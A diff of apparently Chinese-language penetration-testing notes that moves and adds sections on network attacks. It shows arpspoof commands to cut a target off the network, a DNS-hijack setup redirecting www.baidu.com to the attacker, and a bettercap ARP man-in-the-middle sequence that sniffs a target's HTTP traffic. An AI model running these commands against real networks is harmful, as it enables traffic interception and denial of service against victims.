@@ -339,13 +339,13 @@ https://blog.csdn.net/m0_74806866/article/details/134853842
 ettercap -G
 ```
 
-### 1）arp攻击断网
+## （1）arp攻击断网
 
 ```bash
 arpspoof -i eth0(网卡名) -t 靶机ip 网关
 ```
 
-### 2）DNS劫持
+## （2）DNS劫持
 
 * 在攻击机上启动Apache2服务：
 
@@ -369,6 +369,26 @@ arpspoof -i eth0(网卡名) -t 靶机ip 网关
   ```
 
   靶机解析www.baidu.com域名时跳转到攻击机IP。
+
+## （3）bettercap
+
+### arp中间人查看目标http请求
+
+```bash
+bettercap
+
+net.probe on
+
+net.show
+
+ set arp.spoof.targets targetIP,gatewayIP 
+
+arp.spoof on
+
+net.sniff on
+```
+
+### DNS劫持
 
 # 8. BrupSuite
 
@@ -636,25 +656,7 @@ https://www.cnblogs.com/webapplee/p/4060322.html
 
 
 
-# 14. bettercap
 
-## （1）arp中间人查看目标http请求
-
-```bash
-bettercap
-
-net.probe on
-
-net.show
-
- set arp.spoof.targets targetIP,gatewayIP 
-
-arp.spoof on
-
-net.sniff on
-```
-
-## 
 
 # 15. MetaSploit（msf)
 
@@ -766,7 +768,7 @@ sudo apt-get install macchanger
 
 ```bash
 #停用wlan0端口
-airmon-ng stop wlan0
+#airmon-ng stop wlan0	#这句是停用监听模式
 ifconfig wlan0 down
 ```
 
@@ -777,8 +779,8 @@ macchanger -r wlan0
 
 ```bash
 #重启端口
-ifconfig wlan0 up
-airmon-ng start wlan0
+ifconfig wlan0 up	
+#airmon-ng start wlan0	#启动监听模式
 ```
 
 ```bash
